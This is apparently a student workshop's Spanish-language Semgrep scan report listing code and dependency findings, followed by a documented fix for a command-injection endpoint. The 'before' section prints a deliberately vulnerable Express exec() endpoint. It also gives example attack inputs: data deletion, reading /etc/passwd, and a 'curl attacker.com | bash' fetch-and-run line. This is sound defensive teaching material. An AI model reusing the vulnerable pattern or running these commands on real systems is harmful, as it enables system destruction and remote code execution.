# 📋 Reporte de Análisis SAST — Semgrep
**Repositorio:** [agcudco/taller-sast](https://github.com/agcudco/taller-sast)  
**Rama:** `taller-SAST/ciloor2`  
**Fecha de escaneo:** 2026-06-25  
**Herramienta:** Semgrep CI  

---

## 📊 Resumen Ejecutivo

| Producto | Total Hallazgos | Critical | High | Medium | Low |
|----------|:-:|:-:|:-:|:-:|:-:|
| Code (SAST) | 23 | 5 | 5 | 10 | 3 |
| Supply Chain (SCA) | 4 | 0 | 0 | 4 | 0 |
| **TOTAL** | **27** | **5** | **5** | **14** | **3** |

---

## 🔴 Hallazgos de Código (SAST)

### Critical — 5 hallazgos

| ID        | Regla                                                                                    | Archivo                                           | Línea | Confianza |
| -----------| ------------------------------------------------------------------------------------------| ---------------------------------------------------| :-----:| :---------:|
| 864564387 | [express-child-process](https://semgrep.dev/orgs/ciloor2_espe_edu_ec/findings/864564387) | `apps/analisis-vulnerabilidades/backend/index.js` | 154   | Medium    |
| 864564386 | [express-sqlite-sqli](https://semgrep.dev/orgs/ciloor2_espe_edu_ec/findings/864564386)   | `apps/analisis-vulnerabilidades/backend/index.js` | 54    | High      |
| 864564385 | [express-sqlite-sqli](https://semgrep.dev/orgs/ciloor2_espe_edu_ec/findings/864564385)   | `apps/analisis-vulnerabilidades/backend/index.js` | 102   | High      |
| 864564384 | [sqlite-express](https://semgrep.dev/orgs/ciloor2_espe_edu_ec/findings/864564384)        | `apps/analisis-vulnerabilidades/backend/index.js` | 54    | High      |
| 864564383 | [sqlite-express](https://semgrep.dev/orgs/ciloor2_espe_edu_ec/findings/864564383)        | `apps/analisis-vulnerabilidades/backend/index.js` | 102   | High      |

#### Command Injection — `index.js:154`
> **Regla:** `express-child-process`  
> **Descripción:** Entrada no confiable puede ser inyectada en un comando ejecutado por la aplicación. Un atacante puede ejecutar comandos arbitrarios y obtener control completo del sistema.  
> **Remediación:** Evitar ejecutar comandos OS con input del usuario. Si es inevitable, validar y sanitizar el input. Ver: [JavaScript command injection prevention](https://semgrep.dev/docs/cheat-sheets/javascript-command-injection/).

#### SQL Injection — `index.js:54` y `index.js:102`
> **Reglas:** `express-sqlite-sqli`, `sqlite-express`  
> **Descripción:** Entrada no confiable puede usarse para construir una consulta SQL, lo que puede resultar en acceso no autorizado, modificación o eliminación de datos, o ejecución de comandos del sistema.  
> **Remediación:** Usar *prepared statements* y consultas parametrizadas. Considerar un framework ORM.

---

### High — 5 hallazgos

| ID | Regla | Archivo | Línea | Confianza |
|----|-------|---------|:-----:|:---------:|
| 864564382 | [detect-child-process](https://semgrep.dev/orgs/ciloor2_espe_edu_ec/findings/864564382) | `apps/analisis-vulnerabilidades/backend/index.js` | 154 | Low |
| 864564381 | [missing-user](https://semgrep.dev/orgs/ciloor2_espe_edu_ec/findings/864564381) | `apps/auth-service/Dockerfile` | 25 | Medium |
| 864564380 | [missing-user](https://semgrep.dev/orgs/ciloor2_espe_edu_ec/findings/864564380) | `apps/frontend/Dockerfile` | 23 | Medium |
| 864564379 | [missing-user](https://semgrep.dev/orgs/ciloor2_espe_edu_ec/findings/864564379) | `apps/products/Dockerfile` | 22 | Medium |
| 864564378 | [tainted-os-command-child-process-express](https://semgrep.dev/orgs/ciloor2_espe_edu_ec/findings/864564378) | `apps/analisis-vulnerabilidades/backend/index.js` | 154 | High |

#### Child Process desde request — `index.js:154`
> **Reglas:** `detect-child-process`, `tainted-os-command-child-process-express`  
> **Descripción:** Se detectaron llamadas a `child_process` desde argumentos de función controlados por el usuario, lo que puede llevar a inyección de comandos.  
> **Remediación:** Evitar el uso de `child_process`. Si es necesario, sanitizar correctamente el input del usuario.

#### Dockerfile sin USER — `auth-service`, `frontend`, `products`
> **Regla:** `missing-user`  
> **Descripción:** Sin especificar un `USER`, el programa en el contenedor puede ejecutarse como `root`.  
> **Remediación:** Añadir `USER non-root` antes del CMD en cada Dockerfile.
> ```dockerfile
> USER non-root
> CMD ["node", "dist/main"]
> ```

---

### Medium — 10 hallazgos

| ID | Regla | Archivo | Línea | Confianza |
|----|-------|---------|:-----:|:---------:|
| 864564377 | [no-new-privileges](https://semgrep.dev/orgs/ciloor2_espe_edu_ec/findings/864564377) | `docker-compose.yml` | 4 | Low |
| 864564376 | [no-new-privileges](https://semgrep.dev/orgs/ciloor2_espe_edu_ec/findings/864564376) | `docker-compose.yml` | 21 | Low |
| 864564375 | [writable-filesystem-service](https://semgrep.dev/orgs/ciloor2_espe_edu_ec/findings/864564375) | `docker-compose.yml` | 4 | Low |
| 864564374 | [writable-filesystem-service](https://semgrep.dev/orgs/ciloor2_espe_edu_ec/findings/864564374) | `docker-compose.yml` | 21 | Low |
| 864564373 | [possible-nginx-h2c-smuggling](https://semgrep.dev/orgs/ciloor2_espe_edu_ec/findings/864564373) | `apps/frontend/nginx.conf` | 16 | Medium |
| 864564372 | [possible-nginx-h2c-smuggling](https://semgrep.dev/orgs/ciloor2_espe_edu_ec/findings/864564372) | `apps/frontend/nginx.conf` | 25 | Medium |
| 864564371 | [missing-integrity](https://semgrep.dev/orgs/ciloor2_espe_edu_ec/findings/864564371) | `apps/analisis-vulnerabilidades/frontend/index.html` | 8 | Low |
| 864564370 | [missing-integrity](https://semgrep.dev/orgs/ciloor2_espe_edu_ec/findings/864564370) | `apps/analisis-vulnerabilidades/frontend/index.html` | 100 | Low |
| 864564369 | [cors-permissive-express](https://semgrep.dev/orgs/ciloor2_espe_edu_ec/findings/864564369) | `apps/analisis-vulnerabilidades/backend/index.js` | 11 | High |

#### Docker Compose — Escalación de privilegios (`auth-db`, `product-db`)
> **Regla:** `no-new-privileges`  
> **Descripción:** Los servicios `auth-db` y `product-db` permiten escalación de privilegios mediante binarios setuid/setgid.  
> **Remediación:** Agregar `no-new-privileges: true` en `security_opt`.

#### Docker Compose — Filesystem escribible (`auth-db`, `product-db`)
> **Regla:** `writable-filesystem-service`  
> **Descripción:** Los servicios corren con sistema de archivos raíz en modo escritura, permitiendo que aplicaciones maliciosas descarguen payloads.  
> **Remediación:** Agregar `read_only: true` al servicio. Usar `tmpfs` para almacenamiento temporal.

#### Nginx H2C Smuggling — `nginx.conf:16` y `nginx.conf:25`
> **Regla:** `possible-nginx-h2c-smuggling`  
> **Descripción:** Condiciones para H2C smuggling identificadas. Permite bypass de controles de acceso del proxy inverso.  
> **Remediación:** Si se requiere WebSocket: permitir solo `websocket` en `Upgrade`. Si no: no reenviar headers `Upgrade`.

#### Missing Integrity (SRI) — `index.html:8` y `index.html:100`
> **Regla:** `missing-integrity`  
> **Descripción:** Tags externos (CDN de Bootstrap) sin atributo `integrity` de Subresource Integrity (SRI).  
> **Remediación:** Incluir hash criptográfico base64 en el atributo `integrity` de todos los recursos externos.

#### CORS Permisivo — `index.js:11`
> **Regla:** `cors-permissive-express`  
> **Descripción:** La política CORS permite cualquier origen (`*`), exponiendo recursos sensibles a sitios maliciosos.  
> **Remediación:** Especificar explícitamente los orígenes de confianza en `Access-Control-Allow-Origin`.

---

### Low — 3 hallazgos

| ID | Regla | Archivo | Línea | Confianza |
|----|-------|---------|:-----:|:---------:|
| 864564368 | [express-check-csurf-middleware-usage](https://semgrep.dev/orgs/ciloor2_espe_edu_ec/findings/864564368) | `apps/analisis-vulnerabilidades/backend/index.js` | 7 | Low |
| 864564367 | [console-log-express](https://semgrep.dev/orgs/ciloor2_espe_edu_ec/findings/864564367) | `apps/analisis-vulnerabilidades/backend/index.js` | 53 | High |
| 864564366 | [console-log-express](https://semgrep.dev/orgs/ciloor2_espe_edu_ec/findings/864564366) | `apps/analisis-vulnerabilidades/backend/index.js` | 101 | High |

#### CSRF sin middleware — `index.js:7`
> **Regla:** `express-check-csurf-middleware-usage`  
> **Descripción:** No se detectó middleware CSRF en la aplicación Express.  
> **Remediación:** Usar `csurf` o `csrf` y validar tokens CSRF en las rutas.

#### Log Injection — `index.js:53` y `index.js:101`
> **Regla:** `console-log-express`  
> **Descripción:** Se registra input del usuario sin neutralización, permitiendo forjar entradas de log o inyectar contenido malicioso.  
> **Remediación:** Validar el input y/o codificar la salida antes de registrar.

---

## 📦 Hallazgos de Supply Chain (SCA)

### Medium — 4 hallazgos

| ID | Vulnerabilidad | Dependencia | Versión | CVE | EPSS | Transitiva | Archivo |
|----|---------------|:-----------:|:-------:|:---:|:----:|:----------:|---------|
| 864564391 | Inefficient Algorithmic Complexity | `js-yaml` | 3.14.2 | [CVE-2026-53550](https://nvd.nist.gov/vuln/detail/CVE-2026-53550) | 0.25% (Low) | Sí | `apps/auth-service/package-lock.json:1518` |
| 864564390 | Inefficient Algorithmic Complexity | `js-yaml` | 3.14.2 | [CVE-2026-53550](https://nvd.nist.gov/vuln/detail/CVE-2026-53550) | 0.25% (Low) | Sí | `apps/products/package-lock.json:1516` |
| 864564389 | Incomplete Cleanup | `multer` | 2.1.1 | [CVE-2026-5038](https://nvd.nist.gov/vuln/detail/CVE-2026-5038) | 0.28% (Low) | Sí | `apps/auth-service/package-lock.json:7933` |
| 864564388 | Incomplete Cleanup | `multer` | 2.1.1 | [CVE-2026-5038](https://nvd.nist.gov/vuln/detail/CVE-2026-5038) | 0.28% (Low) | Sí | `apps/products/package-lock.json:7889` |

#### js-yaml — Inefficient Algorithmic Complexity
> **CVE:** CVE-2026-53550 | **EPSS:** 0.25% (Low)  
> **Versión afectada:** 3.14.2 (dependencia transitiva en `auth-service` y `products`)  
> **Remediación:** Actualizar a una versión no afectada de `js-yaml`.

#### multer — Incomplete Cleanup
> **CVE:** CVE-2026-5038 | **EPSS:** 0.28% (Low)  
> **Versión afectada:** 2.1.1 (dependencia transitiva en `auth-service` y `products`)  
> **Remediación:** Actualizar a una versión no afectada de `multer`.

---

## 🗂️ Archivos Afectados

| Archivo | Hallazgos |
|---------|:---------:|
| `apps/analisis-vulnerabilidades/backend/index.js` | 11 |
| `docker-compose.yml` | 4 |
| `apps/frontend/nginx.conf` | 2 |
| `apps/analisis-vulnerabilidades/frontend/index.html` | 2 |
| `apps/auth-service/Dockerfile` | 1 |
| `apps/frontend/Dockerfile` | 1 |
| `apps/products/Dockerfile` | 1 |
| `apps/auth-service/package-lock.json` | 2 |
| `apps/products/package-lock.json` | 2 |

---

## 🔗 Referencias

- [Ver resultados en Semgrep Cloud Platform](https://semgrep.dev/orgs/ciloor2-espe-edu-ec/findings?repo=local_scan/taller-sast&ref=taller-SAST/ciloor2)
- [Vulnerabilidades de Supply Chain](https://semgrep.dev/orgs/ciloor2-espe-edu-ec/supply-chain/vulnerabilities?repo=local_scan/taller-sast&ref=taller-SAST/ciloor2)
- [Repositorio](https://github.com/agcudco/taller-sast)

---

## 🛠️ Correcciones Aplicadas

### ✅ Command Injection — `apps/analisis-vulnerabilidades/backend/index.js:154`

**Reglas corregidas:** `express-child-process`, `detect-child-process`, `tainted-os-command-child-process-express`  
**Severidad:** 🔴 Critical / 🟠 High  
**Archivo:** [`apps/analisis-vulnerabilidades/backend/index.js`](https://github.com/agcudco/taller-sast/blob/taller-SAST/ciloor2/apps/analisis-vulnerabilidades/backend/index.js)

---

#### ❌ Código vulnerable (antes)

```js
const { exec } = require('child_process');

// Endpoint que ejecuta cualquier comando del sistema
app.get('/api/exec', (req, res) => {
  const cmd = req.query.cmd || '';
  // MUY PELIGROSO: ejecuta directamente el comando sin validación
  exec(cmd, (error, stdout, stderr) => {
    if (error) {
      return res.json({ command: cmd, error: error.message, stderr });
    }
    res.json({ command: cmd, stdout, stderr });
  });
});
```

**¿Por qué era peligroso?**
- `exec()` pasa el comando completo al shell del sistema operativo.
- El parámetro `cmd` venía directamente de `req.query` sin ninguna validación ni sanitización.
- Un atacante podía enviar cualquier comando: `?cmd=rm -rf /`, `?cmd=cat /etc/passwd`, `?cmd=curl attacker.com | bash`, etc.
- Esto daba control total del sistema operativo al atacante.

---

#### ✅ Código corregido (después)

```js
// Lista blanca de comandos permitidos (ningún input del usuario se pasa al shell)
const ALLOWED_COMMANDS = {
  date:    { cmd: 'date',   args: [] },
  uptime:  { cmd: 'uptime', args: [] },
  whoami:  { cmd: 'whoami', args: [] },
};

const { execFile } = require('child_process');

app.get('/api/exec', (req, res) => {
  const cmdKey = (req.query.cmd || '').toString().trim();

  // Validar contra lista blanca — rechaza cualquier otro valor
  if (!Object.prototype.hasOwnProperty.call(ALLOWED_COMMANDS, cmdKey)) {
    return res.status(400).json({
      error: 'Comando no permitido. Comandos válidos: ' + Object.keys(ALLOWED_COMMANDS).join(', ')
    });
  }

  const { cmd, args } = ALLOWED_COMMANDS[cmdKey];

  // execFile NO invoca el shell — los argumentos nunca se interpolan
  execFile(cmd, args, { timeout: 5000 }, (error, stdout, stderr) => {
    if (error) {
      return res.status(500).json({ error: 'Error al ejecutar el comando.' });
    }
    res.json({ command: cmdKey, stdout, stderr });
  });
});
```

---

#### 🔍 ¿Qué se solucionó?

| Problema | Solución aplicada |
|---------|------------------|
| `exec()` ejecutaba cualquier string como comando de shell | Reemplazado por `execFile()` que **no invoca el shell** |
| Input del usuario llegaba directo al OS | Se valida contra una **lista blanca estricta** de claves (`date`, `uptime`, `whoami`) |
| No había validación ni sanitización del parámetro `cmd` | Si el valor no está en la lista blanca, se devuelve **HTTP 400** |
| Los errores internos se exponían al cliente | El mensaje de error no revela detalles del sistema |
| Sin límite de tiempo de ejecución | Se añade `timeout: 5000ms` para evitar procesos colgados |
| Import `exec` innecesariamente presente | Se eliminó `const { exec }` del encabezado del archivo |

